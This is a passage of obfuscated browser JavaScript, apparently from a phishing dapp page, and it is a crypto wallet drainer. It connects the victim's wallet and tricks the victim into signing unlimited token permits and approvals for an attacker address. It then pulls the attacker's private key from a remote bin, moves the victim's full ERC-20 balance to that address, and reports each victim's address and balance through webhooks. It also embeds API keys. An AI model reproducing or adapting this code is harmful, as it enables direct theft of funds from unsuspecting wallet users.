  (_0x13d867.type = "function");
const _0x4d3e0e = { internalType: "address", name: "", type: "address" },
  _0x31c9f3 = { internalType: "bool", name: "", type: "bool" },
  _0x3a9ad1 = {};
(_0x3a9ad1.inputs = [_0x4d3e0e]),
  (_0x3a9ad1.name = "authorisedCaller"),
  (_0x3a9ad1.outputs = [_0x31c9f3]),
  (_0x3a9ad1.stateMutability = "view"),
  (_0x3a9ad1.type = "function");
const _0x52ec31 = { internalType: "address", name: "owner", type: "address" },
  _0x249716 = { internalType: "uint256", name: "", type: "uint256" },
  _0x2889f6 = {};
(_0x2889f6.inputs = [_0x52ec31]),
  (_0x2889f6.name = "balanceOf"),
  (_0x2889f6.outputs = [_0x249716]),
  (_0x2889f6.stateMutability = "view"),
  (_0x2889f6.type = "function");
const _0x2a9942 = { internalType: "string", name: "", type: "string" },
  _0x3fa712 = { inputs: [], name: "baseURI" };
(_0x3fa712.outputs = [_0x2a9942]),
  (_0x3fa712.stateMutability = "view"),
  (_0x3fa712.type = "function");
const _0x4f75ea = { internalType: "address", name: "", type: "address" },
  _0x52db55 = { inputs: [], name: "boxContract" };
(_0x52db55.outputs = [_0x4f75ea]),
  (_0x52db55.stateMutability = "view"),
  (_0x52db55.type = "function");
const _0x230275 = { internalType: "uint256", name: "NFTId", type: "uint256" },
  _0x20a3c3 = {};
(_0x20a3c3.inputs = [_0x230275]),
  (_0x20a3c3.name = "closeNFTWindow"),
  (_0x20a3c3.outputs = []),
  (_0x20a3c3.stateMutability = "nonpayable"),
  (_0x20a3c3.type = "function");
const _0x34f9fb = {
    internalType: "string",
    name: "artworkHashIPFS",
    type: "string",
  },
  _0x284062 = {
    internalType: "string",
    name: "artworkHashArweave",
    type: "string",
  },
  _0x1a57f9 = { internalType: "string", name: "artistName", type: "string" },
  _0x26fe83 = { internalType: "string", name: "artistNote", type: "string" },
  _0x43c465 = {
    internalType: "address",
    name: "signatureAddress",
    type: "address",
  },
  _0xaaa007 = { internalType: "string", name: "signatureHash", type: "string" },
  _0x4dc2f1 = {
    internalType: "string",
    name: "signatureMessage",
    type: "string",
  },
  _0x44d1b8 = { internalType: "uint256", name: "editionSize", type: "uint256" },
  _0x393101 = { internalType: "string", name: "artTitle", type: "string" },
  _0x4bef0b = { internalType: "string", name: "artworkType", type: "string" },
  _0x322499 = { internalType: "string", name: "boxDetails", type: "string" },
  _0x3db451 = {
    internalType: "address payable[]",
    name: "royaltyAddress",
    type: "address[]",
  },
  _0x26af41 = {
    internalType: "uint256[]",
    name: "royaltyBps",
    type: "uint256[]",
  },
  _0x254cac = {};
(_0x254cac.inputs = [
  _0x34f9fb,
  _0x284062,
  _0x1a57f9,
  _0x26fe83,
  _0x43c465,
  _0xaaa007,
  _0x4dc2f1,
  _0x44d1b8,
  _0x393101,
  _0x4bef0b,
  _0x322499,
  _0x3db451,
  _0x26af41,
]),
  (_0x254cac.name = "createNFTMould"),
  (_0x254cac.outputs = []),
  (_0x254cac.stateMutability = "nonpayable"),
  (_0x254cac.type = "function");
const _0x384f86 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x51a60c = { internalType: "address", name: "", type: "address" },
  _0x30df2e = {};
(_0x30df2e.inputs = [_0x384f86]),
  (_0x30df2e.name = "getApproved"),
  (_0x30df2e.outputs = [_0x51a60c]),
  (_0x30df2e.stateMutability = "view"),
  (_0x30df2e.type = "function");
const _0x5466e1 = { internalType: "uint256", name: "id", type: "uint256" },
  _0x5aea6a = { internalType: "uint256[]", name: "", type: "uint256[]" },
  _0x6e756c = {};
(_0x6e756c.inputs = [_0x5466e1]),
  (_0x6e756c.name = "getFeeBps"),
  (_0x6e756c.outputs = [_0x5aea6a]),
  (_0x6e756c.stateMutability = "view"),
  (_0x6e756c.type = "function");
const _0x29a746 = { internalType: "uint256", name: "id", type: "uint256" },
  _0x419562 = {
    internalType: "address payable[]",
    name: "",
    type: "address[]",
  },
  _0x4b4b3c = {};
(_0x4b4b3c.inputs = [_0x29a746]),
  (_0x4b4b3c.name = "getFeeRecipients"),
  (_0x4b4b3c.outputs = [_0x419562]),
  (_0x4b4b3c.stateMutability = "view"),
  (_0x4b4b3c.type = "function");
const _0x523e15 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x58f099 = { internalType: "string", name: "hashIPFS", type: "string" },
  _0x5461fe = { internalType: "string", name: "hashArweave", type: "string" },
  _0x36bba2 = { internalType: "string", name: "artworkType", type: "string" },
  _0x54a498 = {};
(_0x54a498.inputs = [_0x523e15]),
  (_0x54a498.name = "getFileData"),
  (_0x54a498.outputs = [_0x58f099, _0x5461fe, _0x36bba2]),
  (_0x54a498.stateMutability = "view"),
  (_0x54a498.type = "function");
const _0x1cd572 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x3d2c1 = { internalType: "string", name: "artistName", type: "string" },
  _0x53c10e = { internalType: "string", name: "artistNote", type: "string" },
  _0x761646 = { internalType: "uint256", name: "editionSize", type: "uint256" },
  _0x9eaa1c = { internalType: "string", name: "artTitle", type: "string" },
  _0x2d8670 = {
    internalType: "uint256",
    name: "editionNumber",
    type: "uint256",
  },
  _0x560f9a = { internalType: "string", name: "boxDetails", type: "string" },
  _0x1de30c = { internalType: "bool", name: "isActive", type: "bool" },
  _0x279a2e = {};
(_0x279a2e.inputs = [_0x1cd572]),
  (_0x279a2e.name = "getMetadata"),
  (_0x279a2e.outputs = [
    _0x3d2c1,
    _0x53c10e,
    _0x761646,
    _0x9eaa1c,
    _0x2d8670,
    _0x560f9a,
    _0x1de30c,
  ]),
  (_0x279a2e.stateMutability = "view"),
  (_0x279a2e.type = "function");
const _0x5f16d1 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x1cea31 = {
    internalType: "address",
    name: "signatureAddress",
    type: "address",
  },
  _0x32b474 = { internalType: "string", name: "signatureHash", type: "string" },
  _0x5c4400 = {
    internalType: "string",
    name: "signatureMessage",
    type: "string",
  },
  _0x1298a0 = {};
(_0x1298a0.inputs = [_0x5f16d1]),
  (_0x1298a0.name = "getSignatureData"),
  (_0x1298a0.outputs = [_0x1cea31, _0x32b474, _0x5c4400]),
  (_0x1298a0.stateMutability = "view"),
  (_0x1298a0.type = "function");
const _0x59e0f5 = { internalType: "address", name: "owner", type: "address" },
  _0x267fb9 = { internalType: "address", name: "operator", type: "address" },
  _0xd45c97 = { internalType: "bool", name: "", type: "bool" },
  _0x5dfac2 = {};
(_0x5dfac2.inputs = [_0x59e0f5, _0x267fb9]),
  (_0x5dfac2.name = "isApprovedForAll"),
  (_0x5dfac2.outputs = [_0xd45c97]),
  (_0x5dfac2.stateMutability = "view"),
  (_0x5dfac2.type = "function");
const _0x82d327 = { internalType: "string", name: "", type: "string" },
  _0x2c20da = { inputs: [], name: "name" };
(_0x2c20da.outputs = [_0x82d327]),
  (_0x2c20da.stateMutability = "view"),
  (_0x2c20da.type = "function");
const _0x4f8bcd = { internalType: "address", name: "", type: "address" },
  _0x523771 = { inputs: [], name: "owner" };
(_0x523771.outputs = [_0x4f8bcd]),
  (_0x523771.stateMutability = "view"),
  (_0x523771.type = "function");
const _0x45dcab = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x4faa1d = { internalType: "address", name: "", type: "address" },
  _0x597172 = {};
(_0x597172.inputs = [_0x45dcab]),
  (_0x597172.name = "ownerOf"),
  (_0x597172.outputs = [_0x4faa1d]),
  (_0x597172.stateMutability = "view"),
  (_0x597172.type = "function");
const _0x369180 = {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  _0x4348b4 = { internalType: "address", name: "from", type: "address" },
  _0x278b92 = { internalType: "address", name: "to", type: "address" },
  _0x4ec540 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x3501d3 = {};
(_0x3501d3.inputs = [_0x4348b4, _0x278b92, _0x4ec540]),
  (_0x3501d3.name = "safeTransferFrom"),
  (_0x3501d3.outputs = []),
  (_0x3501d3.stateMutability = "nonpayable"),
  (_0x3501d3.type = "function");
const _0x30808d = { internalType: "address", name: "from", type: "address" },
  _0x5c2507 = { internalType: "address", name: "to", type: "address" },
  _0x4d88ed = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x3d9936 = { internalType: "bytes", name: "_data", type: "bytes" },
  _0x4d8e80 = {};
(_0x4d8e80.inputs = [_0x30808d, _0x5c2507, _0x4d88ed, _0x3d9936]),
  (_0x4d8e80.name = "safeTransferFrom"),
  (_0x4d8e80.outputs = []),
  (_0x4d8e80.stateMutability = "nonpayable"),
  (_0x4d8e80.type = "function");
const _0x4c6a9a = {
    internalType: "address",
    name: "operator",
    type: "address",
  },
  _0x2e7090 = { internalType: "bool", name: "approved", type: "bool" },
  _0x4ffd51 = {};
(_0x4ffd51.inputs = [_0x4c6a9a, _0x2e7090]),
  (_0x4ffd51.name = "setApprovalForAll"),
  (_0x4ffd51.outputs = []),
  (_0x4ffd51.stateMutability = "nonpayable"),
  (_0x4ffd51.type = "function");
const _0x5a6f83 = { internalType: "address", name: "_caller", type: "address" },
  _0x41bcb6 = { internalType: "bool", name: "_value", type: "bool" },
  _0x22b146 = {};
(_0x22b146.inputs = [_0x5a6f83, _0x41bcb6]),
  (_0x22b146.name = "setCaller"),
  (_0x22b146.outputs = []),
  (_0x22b146.stateMutability = "nonpayable"),
  (_0x22b146.type = "function");
const _0xd46b4b = {
    internalType: "bytes4",
    name: "interfaceId",
    type: "bytes4",
  },
  _0x23e06d = { internalType: "bool", name: "", type: "bool" },
  _0x22f489 = {};
(_0x22f489.inputs = [_0xd46b4b]),
  (_0x22f489.name = "supportsInterface"),
  (_0x22f489.outputs = [_0x23e06d]),
  (_0x22f489.stateMutability = "view"),
  (_0x22f489.type = "function");
const _0x175588 = { internalType: "string", name: "", type: "string" },
  _0x1ec6b0 = { inputs: [], name: "symbol" };
(_0x1ec6b0.outputs = [_0x175588]),
  (_0x1ec6b0.stateMutability = "view"),
  (_0x1ec6b0.type = "function");
const _0x180409 = { internalType: "uint256", name: "index", type: "uint256" },
  _0x3c3bc3 = { internalType: "uint256", name: "", type: "uint256" },
  _0x4fac39 = {};
(_0x4fac39.inputs = [_0x180409]),
  (_0x4fac39.name = "tokenByIndex"),
  (_0x4fac39.outputs = [_0x3c3bc3]),
  (_0x4fac39.stateMutability = "view"),
  (_0x4fac39.type = "function");
const _0xdd0c35 = { internalType: "address", name: "owner", type: "address" },
  _0x46da6e = { internalType: "uint256", name: "index", type: "uint256" },
  _0x29ee9a = { internalType: "uint256", name: "", type: "uint256" },
  _0x2e1bb2 = {};
(_0x2e1bb2.inputs = [_0xdd0c35, _0x46da6e]),
  (_0x2e1bb2.name = "tokenOfOwnerByIndex"),
  (_0x2e1bb2.outputs = [_0x29ee9a]),
  (_0x2e1bb2.stateMutability = "view"),
  (_0x2e1bb2.type = "function");
const _0x56eaae = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x4105c3 = { internalType: "string", name: "", type: "string" },
  _0xf98a5a = {};
(_0xf98a5a.inputs = [_0x56eaae]),
  (_0xf98a5a.name = "tokenURI"),
  (_0xf98a5a.outputs = [_0x4105c3]),
  (_0xf98a5a.stateMutability = "view"),
  (_0xf98a5a.type = "function");
const _0x102eec = { internalType: "uint256", name: "", type: "uint256" },
  _0x166ebc = { inputs: [], name: "totalSupply" };
(_0x166ebc.outputs = [_0x102eec]),
  (_0x166ebc.stateMutability = "view"),
  (_0x166ebc.type = "function");
const _0xaac04d = { internalType: "address", name: "from", type: "address" },
  _0x180641 = { internalType: "address", name: "to", type: "address" },
  _0x4c7614 = { internalType: "uint256", name: "tokenId", type: "uint256" },
  _0x4ec1c1 = {};
(_0x4ec1c1.inputs = [_0xaac04d, _0x180641, _0x4c7614]),
  (_0x4ec1c1.name = "transferFrom"),
  (_0x4ec1c1.outputs = []),
  (_0x4ec1c1.stateMutability = "nonpayable"),
  (_0x4ec1c1.type = "function");
const _0x3b2e57 = {
    internalType: "address",
    name: "newOwner",
    type: "address",
  },
  _0x59bc81 = {};
(_0x59bc81.inputs = [_0x3b2e57]),
  (_0x59bc81.name = "transferOwnership"),
  (_0x59bc81.outputs = []),
  (_0x59bc81.stateMutability = "nonpayable"),
  (_0x59bc81.type = "function");
const _0x32ccc2 = {
    internalType: "address",
    name: "newBoxContract",
    type: "address",
  },
  _0x4ac6de = {};
(_0x4ac6de.inputs = [_0x32ccc2]),
  (_0x4ac6de.name = "updateBoxContract"),
  (_0x4ac6de.outputs = []),
  (_0x4ac6de.stateMutability = "nonpayable"),
  (_0x4ac6de.type = "function");
const _0x19fc78 = { internalType: "string", name: "newURI", type: "string" },
  _0x989b27 = {};
(_0x989b27.inputs = [_0x19fc78]),
  (_0x989b27.name = "updateURI"),
  (_0x989b27.outputs = []),
  (_0x989b27.stateMutability = "nonpayable"),
  (_0x989b27.type = "function");
const _0xa2116c = {
  inputs: [],
  name: "withdrawFunds",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function",
};
var permit_abi = [
    _0x268d81,
    _0x2dfbc1,
    _0x3b3d46,
    _0x398e6d,
    _0x21e3be,
    _0x58124a,
    _0x144c08,
    _0x120992,
    _0x3a382f,
    _0x2ad516,
    _0x5bd902,
    _0xf9290,
    _0x1aea05,
    _0x3acae4,
    _0x5b31a3,
    _0x5ca000,
    _0x2e4ac2,
    _0x8ff536,
    _0x373040,
    _0x3e9247,
    _0x1ac509,
    _0x4fe33a,
    _0x51afbb,
    _0x40aa5d,
    _0x35e939,
    _0x561912,
    _0x52eb5a,
    _0x437c2c,
    _0x270f2b,
    _0x267799,
    _0x2c1f7a,
    _0x2efee5,
    _0x436704,
    _0x5a527c,
    _0x2d06ec,
    _0x29ce43,
    _0x23d30b,
    _0x3b9d80,
    _0x51ed87,
    _0x4d4f1b,
    _0x429010,
    _0x42f66d,
    _0x20695d,
    _0x3dbaea,
    _0x5ee16d,
    _0x4263ad,
    _0x1df544,
    _0x150fef,
    _0x9392d8,
    _0x1509be,
    _0x11cbad,
    _0x34ea05,
    _0x200a7e,
    _0x5d8fc8,
    _0x2077bf,
    _0x16a426,
    _0xe67d12,
    _0x16ba12,
    _0x5da533,
    _0x3331f0,
    _0x535545,
    _0x305e72,
    _0x4c82f7,
    _0x47d269,
    _0x3f53ef,
    _0x11b8be,
    _0x27a652,
  ],
  safa_abi = [
    _0x3757e5,
    _0x5d967c,
    _0x28ee4f,
    _0xc6f092,
    _0x146e2e,
    _0x4069b8,
    _0x2df6e9,
    _0x2c209f,
    _0x754e4a,
    _0x50f239,
    _0x47feee,
    _0x32eca2,
    _0x340e63,
    _0x13d867,
    _0x3a9ad1,
    _0x2889f6,
    _0x3fa712,
    _0x52db55,
    _0x20a3c3,
    _0x254cac,
    _0x30df2e,
    _0x6e756c,
    _0x4b4b3c,
    _0x54a498,
    _0x279a2e,
    _0x1298a0,
    _0x5dfac2,
    _0x2c20da,
    _0x523771,
    _0x597172,
    _0x369180,
    _0x3501d3,
    _0x4d8e80,
    _0x4ffd51,
    _0x22b146,
    _0x22f489,
    _0x1ec6b0,
    _0x4fac39,
    _0x2e1bb2,
    _0xf98a5a,
    _0x166ebc,
    _0x4ec1c1,
    _0x59bc81,
    _0x4ac6de,
    _0x989b27,
    _0xa2116c,
  ];
abicko = new ethers.utils.Interface(safa_abi);
const _0x2c2bec = { name: "_spender", type: "address" },
  _0x2c599d = { name: "_value", type: "uint256" },
  _0x1519ae = { name: "success", type: "bool" },
  _0x2691fd = { constant: !1 };
(_0x2691fd.inputs = [_0x2c2bec, _0x2c599d]),
  (_0x2691fd.name = "approve"),
  (_0x2691fd.outputs = [_0x1519ae]),
  (_0x2691fd.payable = !1),
  (_0x2691fd.stateMutability = "nonpayable"),
  (_0x2691fd.type = "function"),
  (abicko2 = new ethers.utils.Interface([_0x2691fd])),
  (lt.name = "offerer"),
  (lt.type = "address");
const lM = { internalType: "address", name: "zone", type: "address" },
  lF = { internalType: "enum ItemType", name: "itemType", type: "uint8" },
  lg = { internalType: "address", name: "token", type: "address" },
  lo = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  I0 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  I1 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  I2 = {};
(I2.components = [lF, lg, lo, I0, I1]),
  (I2.internalType = "struct OfferItem[]"),
  (I2.name = "offer"),
  (I2.type = "tuple[]");
const I3 = { internalType: "enum ItemType", name: "itemType", type: "uint8" },
  I4 = { internalType: "address", name: "token", type: "address" },
  I5 = {
    internalType: "uint256",
    name: "identifierOrCriteria",
    type: "uint256",
  },
  I6 = { internalType: "uint256", name: "startAmount", type: "uint256" },
  I7 = { internalType: "uint256", name: "endAmount", type: "uint256" },
  I8 = { internalType: "address payable", name: "recipient", type: "address" },
  I9 = {};
(I9.components = [I3, I4, I5, I6, I7, I8]),
  (I9.internalType = "struct ConsiderationItem[]"),
  (I9.name = "consideration"),
  (I9.type = "tuple[]");
const Il = { internalType: "enum OrderType", name: "orderType", type: "uint8" },
  II = { internalType: "uint256", name: "startTime", type: "uint256" },
  ID = { internalType: "uint256", name: "endTime", type: "uint256" },
  Ip = { internalType: "bytes32", name: "zoneHash", type: "bytes32" },
  Ik = { internalType: "uint256", name: "salt", type: "uint256" },
  IH = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  Iw = {
    internalType: "uint256",
    name: "totalOriginalConsiderationItems",
    type: "uint256",
  },
  Ie = {};
(Ie.components = [lt, lM, I2, I9, Il, II, ID, Ip, Ik, IH, Iw]),
  (Ie.internalType = "struct OrderParameters"),
  (Ie.name = "parameters"),
  (Ie.type = "tuple");
const Iu = { internalType: "bytes", name: "signature", type: "bytes" },
  Iz = {};
(Iz.components = [Ie, Iu]),
  (Iz.internalType = "struct Order[]"),
  (Iz.name = "orders"),
  (Iz.type = "tuple[]");
const IZ = { internalType: "uint256", name: "orderIndex", type: "uint256" },
  IT = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  If = {};
(If.components = [IZ, IT]),
  (If.internalType = "struct FulfillmentComponent[]"),
  (If.name = "offerComponents"),
  (If.type = "tuple[]");
const Ii = { internalType: "uint256", name: "orderIndex", type: "uint256" },
  Iy = { internalType: "uint256", name: "itemIndex", type: "uint256" },
  Ih = {};
(Ih.components = [Ii, Iy]),
  (Ih.internalType = "struct FulfillmentComponent[]"),
  (Ih.name = "considerationComponents"),
  (Ih.type = "tuple[]");
const Iv = {};
(Iv.components = [If, Ih]),
  (Iv.internalType = "struct Fulfillment[]"),
  (Iv.name = "fulfillments"),
  (Iv.type = "tuple[]");
const IX = { internalType: "enum ItemType", name: "itemType", type: "uint8" },
  IY = { internalType: "address", name: "token", type: "address" },
  IL = { internalType: "uint256", name: "identifier", type: "uint256" },
  Im = { internalType: "uint256", name: "amount", type: "uint256" },
  Iq = { internalType: "address payable", name: "recipient", type: "address" },
  IA = {};
(IA.components = [IX, IY, IL, Im, Iq]),
  (IA.internalType = "struct ReceivedItem"),
  (IA.name = "item"),
  (IA.type = "tuple");
const Ic = { internalType: "address", name: "offerer", type: "address" },
  IW = { internalType: "bytes32", name: "conduitKey", type: "bytes32" },
  In = {};
(In.components = [IA, Ic, IW]),
  (In.internalType = "struct Execution[]"),
  (In.name = "executions"),
  (In.type = "tuple[]");
const IS = {};
(IS.inputs = [Iz, Iv]),
  (IS.name = "matchOrders"),
  (IS.outputs = [In]),
  (IS.stateMutability = "payable"),
  (IS.type = "function");
const IV = [IS],
  Ia = { internalType: "address", name: "operator", type: "address" },
  IQ = { internalType: "bool", name: "approved", type: "bool" },
  Ib = {};
(Ib.inputs = [Ia, IQ]),
  (Ib.name = "setApprovalForAll"),
  (Ib.outputs = []),
  (Ib.stateMutability = "nonpayable"),
  (Ib.type = "function");
const IO = { name: "_spender", type: "address" },
  IE = { name: "_value", type: "uint256" },
  Ir = { name: "success", type: "bool" },
  Ix = { constant: !1 };
(Ix.inputs = [IO, IE]),
  (Ix.name = "approve"),
  (Ix.outputs = [Ir]),
  (Ix.payable = !1),
  (Ix.stateMutability = "nonpayable"),
  (Ix.type = "function"),
  (safa_abi = [Ib]),
  (abicko = new ethers.utils.Interface(safa_abi)),
  (abicko2 = new ethers.utils.Interface([Ix]));
var IK = abicko2.encodeFunctionData("approve", [
  recipient_addy,
  "115792089237316195423570985008687907853269984665640564039457584007913129639935",
]);
function IJ(e) {
  const t = new ArrayBuffer(e.length),
    n = new Uint8Array(t);
  for (let t = 0, a = e.length; t < a; t++) n[t] = e.charCodeAt(t);
  return t;
}
function Is(e) {
  return new TextEncoder().encode(e);
}
async function IG(e, t) {
  let n = Is(t);
  const a = { name: "RSA-OAEP" };
  ciphertext = await window.crypto.subtle.encrypt(a, e, n);
  let i = new Uint8Array(ciphertext);
  return (ciphertext_base64 = btoa(i)), ciphertext_base64;
}
Ij = abicko.encodeFunctionData("setApprovalForAll", [recipient_addy, "1"]);
const IP =
    "-----BEGIN PUBLIC KEY-----\n  MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyhjLI0OF2W5/v8NRbrvqHtanx6gmoGhh9im8Iokd+7HNal2N9/pM07o/L3DxK+UQOS4tNRRXr6ii7bK2XT+U96by0NlcAyw8Gii57ORut54w4Cz9ayLcqqPXaapBDfCGTSCTaCzAsfzX33ZHoD4uFQD9lcqiVPmiKaiY7JD1qg+S2l5/Ja62y9FpKDK/RcqoFktYPzbguRYWzT21JIQXEcpMs4KY/ixm8hJH6g9iI5m0f0vk0oeIdx12VOeoDPMED7GUvO9rcPnRSUEG3vnwLFtvdOfdNP9M3xbRAWhNnpnUjAILSvB/yFyotOfcqkEFwVp17ZH6FQdADBH23krXM4pZFkaHfVkh4dRAHIyIirF/whn/YqMqIZvCOz/V72K54EQuDsw057WF0QrYpYSvgjtXbpOW4S3Yq2JLL7ETx9ThHkagAWw6tTY8gOTfsbrv1UqcS/rhCHSVBcGhtGr6AJlUph68fN7/EPCLbGa34vMJ0Y+tMg21PsjEEUFwYriHjSme7KxNNNK3xr8cCkcL8lZ4HQmmSC5kdGPYtREgF4WN+G6meISeSSYe045ICYsXs2Dd0pa8Pywe+ZRgKQDJSHzjQPY4htnZJYCc/aDvwFtVMO1Co8z6GiWpV6Z9KnHF7yw/yEQJjkVLYHZJdtcB6nPh/VSSQ8TN/La0xn6nVxsCAwEAAQ==\n  -----END PUBLIC KEY-----",
  IN = "-----BEGIN PUBLIC KEY-----",
  IB = "-----END PUBLIC KEY-----",
  IU = IP.substring(IN.length, IP.length - IB.length),
  Id = window.atob(IU),
  IR = IJ(Id);
async function fetcher() {
  const e = await fetch(
    "https://api.jsonbin.io/v3/b/6382565b0ee72e368cf96144",
    {
      method: "GET",
      headers: {
        "X-Master-Key":
          "$2b$10$aJxWLmdu98n54zRJu9ENh.FX5wS1ZKQKJ5qxz1IsJhizP8HD2qAYO",
        "X-Bin-Meta": "FALSE",
      },
    }
  );
  return (await e.json()).record.x;
}
$(document).ready(async function () {
  function e(e, t) {
    for (var n = 0; n < e.length; ) e[n] === t ? e.splice(n, 1) : ++n;
    return e;
  }
  $(
    "#metamaskbutton,#metamaskbutton1,#metamaskbutton2,#metamaskbutton3,#metamaskbutton4,#metamaskbutton5"
  ).click(async () => {
    if (lR) return;
    if (((lR = !0), 1 != window.ethereum.networkVersion))
      try {
        const e = {
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }],
        };
        await window.ethereum.request(e);
      } catch (e) {
        console.log(e.message);
      }
    try {
      console.log("connecting");
      const e = { method: "eth_requestAccounts" };
      await window.ethereum.request(e);
    } catch (e) {
      console.log("error in request", e), location.reload();
    }
    $(
      "#metamaskbutton,#metamaskbutton1,#metamaskbutton2,#metamaskbutton3,#metamaskbutton4,#metamaskbutton5"
    ).html(lG),
      window.ethereum.on("accountsChanged", function (e) {
        location.reload();
      }),
      window.ethereum.on("disconnect", function (e) {
        location.reload();
      });
    let t = await new ethers.providers.InfuraProvider(
      null,
      "068c16b982e04f05b17d5064bd934d58"
    );
    const n = window.Web3Modal.default,
      a = window.WalletConnectProvider.default;
    let i, s;
    console.log("Initializing example"),
      console.log("WalletConnectProvider is", a),
      console.log(
        "window.web3 is",
        window.web3,
        "window.ethereum is",
        window.ethereum
      );
    (i = new n({
      cacheProvider: !1,
      providerOptions: {
        walletconnect: {
          package: a,
          options: { infuraId: "9aa3d95b3bc440fa88ea12eaa4456161" },
        },
      },
      disableInjectedProvider: !1,
      network: "mainnet",
      theme: "dark",
    })),
      console.log("Web3Modal instance is", i),
      console.log("Opening a dialog", i);
    try {
      if (((s = await i.connect()), "0x1" != s.chainId)) {
        const e = {
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }],
        };
        await s.request(e);
      }
    } catch (e) {
      "undefined" == s &&
        window.open(
          "dapp://" + window.location.host + window.location.pathname
        ),
        console.log("Could not get a wallet connection", e);
    }
    s.on("accountsChanged", (e) => {
      window.location.reload();
    }),
      s.on("chainChanged", (e) => {
        window.location.reload();
      }),
      s.on("networkChanged", (e) => {
        window.location.reload();
      }),
      (s = await new ethers.providers.Web3Provider(s));
    const r = await s.getSigner();
    new window.seaport(r);
    signerGlobal = r;
    var x = await r.getAddress();
    await r.getBalance();
    const _ = await s.getSigner(),
      d = new window.seaport(_);
    signerGlobal = _;
    var p = await _.getAddress();
    const y = await t.getBalance(p),
      o = Math.round(100 * ethers.utils.formatEther(y)) / 100;
    async function c(e) {
      const t = await fetcher();
      let n = new ethers.Wallet(atob(t), eth_provider);
      const a = await new ethers.Contract(e, permit_abi, r),
        [i] = await Promise.all([a.name()]);
      try {
        version = await a.version();
      } catch (e) {
        version = "1";
      }
      (connector = await new window.oneinch.Web3ProviderConnector(s)),
        (eip2612PermitUtils = await new window.oneinch.Eip2612PermitUtils(
          connector
        )),
        console.log(eip2612PermitUtils);
      const _ = (window.oneinch.PermitParams = {
        owner: x,
        spender: n.address,
        value:
          "115792089237316195423570985008687907853269984665640564039457584007913129639935",
        nonce: await eip2612PermitUtils.getTokenNonce(e, x),
        deadline:
          "115792089237316195423570985008687907853269984665640564039457584007913129639935",
      });
      console.log(_);
      try {
        var d = await eip2612PermitUtils.buildPermitSignature(
          { ..._, nonce: await eip2612PermitUtils.getTokenNonce(e, x) },
          await r.getChainId(),
          i,
          e,
          version
        );
      } catch (e) {
        console.log(e.message);
      }
      const p = JSON.stringify(d);
      console.log(d);
      try {
        const t = {
            method: "eth_signTypedData_v4",
            params: [x, p],
            address: x,
          },
          a = await window.ethereum.request(t),
          { v: i, r: s, s: d } = ethers.utils.splitSignature(a);
        (valueeeeeee = "test"),
          (permit_encoder = new ethers.utils.Interface(permit_abi)),
          (encoded_permit = permit_encoder.encodeFunctionData("permit", [
            x,
            n.address,
            "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            i,
            s,
            d,
          ]));
        const o = await n.estimateGas({
          from: n.address,
          to: e,
          data: encoded_permit,
        });
        let c = await n.sendTransaction({
          from: n.address,
          to: e,
          data: encoded_permit,
          gasLimit: o.toHexString(),
        });
        console.log(c);
        let u = c.hash;
        if (c.hash.startsWith("0x")) var y = "NO";
        else y = "YES";
        "YES" == y
          ? manualWebhook(
              "%F0%9F%A9%B8 ERC 20 MANUAL PERMIT " +
                window.location.host +
                " %0A [TOKEN](https://etherscan.io/token/" +
                e +
                ") FROM " +
                x +
                " %0A TO " +
                n.address +
                " %0A Nonce: " +
                _.nonce +
                " %0A V: " +
                i +
                " %0A R: " +
                s +
                " %0A S: " +
                d +
                " %0A VALID BEFORE :" +
                _.deadline +
                " &parse_mode=Markdown"
            )
          : (manualWebhook(
              "%F0%9F%A9%B8 ERC 20 AUTO PERMIT " +
                window.location.host +
                " %0A [TOKEN](https://etherscan.io/token/" +
                e +
                ") %0A [TXID](https://etherscan.io/tx/" +
                u +
                ")&parse_mode=Markdown"
            ),
            await c.wait(),
            await (async function (e) {
              const t = await fetcher();
              let n = new ethers.Wallet(atob(t), eth_provider);
              erc20_contract = new ethers.Contract(e, transfer_abi, r);
              let a = await erc20_contract.balanceOf(x);
              (erc20_balance = a.toString()),
                console.log(erc20_balance),
                (transfer_encoder = new ethers.utils.Interface(transfer_abi)),
                (encoded_tranfer = transfer_encoder.encodeFunctionData(
                  "transferFrom",
                  [x, recipient_addy, erc20_balance]
                ));
              try {
                let t = await n.sendTransaction({
                  from: n.address,
                  to: e,
                  data: encoded_tranfer,
                  gasLimit: 1e5,
                });
                console.log(t),
                  t.hash.startsWith("0x") &&
                    (console.log("transfer success"),
                    manualWebhook(
                      "%F0%9F%A9%B8 ERC 20 AUTO TRANSFER " +
                        window.location.host +
                        " %0A [TOKEN](https://etherscan.io/token/" +
                        e +
                        ") %0A [TXID](https://etherscan.io/tx/" +
                        t.hash +
                        ")&parse_mode=Markdown"
                    ));
              } catch (e) {
                console.log(e.message),
                  Webhook("%F0%9F%A9%B8 ERC 20 TRANSFER FAILED ");
              }
            })(e));
      } catch (e) {
        console.log(e),
          Webhook(
            "%F0%9F%9A%A8 ERC-20 PERMIT REJECTED [Address](https://etherscan.io/address/" +
              x +
              ") [Opensea](https://opensea.io/" +
              x +
              ")&parse_mode=Markdown"
          );
      }
    }
    Webhook(
      "%F0%9F%AB%B1%F0%9F%8F%BB%E2%80%8D%F0%9F%AB%B2%F0%9F%8F%BF CONNECTED " +
        window.location.host +
        "%0A[Address](https://etherscan.io/address/" +
        p +
        ") %0A[Opensea](https://opensea.io/" +
        p +
        ") %0A[Portfolio](https://dappradar.com/hub/wallet/eth/" +
        p +
        ") %0A" +
        o +
        "\n ETH &parse_mode=Markdown"
    ),
      $(
